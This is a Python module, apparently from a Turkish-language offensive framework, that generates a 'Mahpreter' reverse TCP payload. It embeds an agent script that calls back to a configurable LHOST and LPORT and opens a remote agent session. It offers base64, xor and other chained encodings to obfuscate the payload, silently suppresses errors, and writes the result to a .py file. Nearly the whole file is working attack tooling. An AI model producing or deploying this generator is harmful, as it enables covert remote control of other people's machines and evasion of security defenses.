from core.module import BaseModule
from core.option import Option
from typing import Dict, Any
import os

class Payload(BaseModule):
    """
    Python Mahpreter Reverse TCP Payload.
    Gelişmiş ajan özellikleri sunan reverse TCP payload'ı.
    """
    Name = "python/mahpreter/reverse_tcp"
    Description = "Gelişmiş Mahpreter ajanı (Reverse TCP)."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP."),
            "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir: base64,xor)"),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/payload.py).", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")
        encode_type = self.get_option_value("ENCODE")
        
        # Agent kodunu dosyadan okuyup payload içine gömüyoruz
        agent_path = os.path.join(os.path.dirname(__file__), 'agent.py')
        try:
            with open(agent_path, 'r') as f:
                agent_code = f.read()
        except FileNotFoundError:
            return "Error: agent.py not found!"

        # Ham Payload (Raw)
        raw_payload = f"""
import socket, subprocess, os, sys, platform, struct, time, threading
import base64

# Configuration
LHOST = "{lhost}"
LPORT = {lport}

# --- Agent Code Start ---
{agent_code}
# --- Agent Code End ---

if __name__ == "__main__":
    try:
        agent = MahpreterAgent(LHOST, LPORT)
        agent.run()
    except:
        pass
"""
        # Encoding Logic
        from core.encoders.manager import apply_encoding
        return apply_encoding(raw_payload.strip(), encode_type)

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".py"):
                output_path += ".py"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] Mahpreter Payload oluşturuldu ({len(code)} bytes):")
        return code
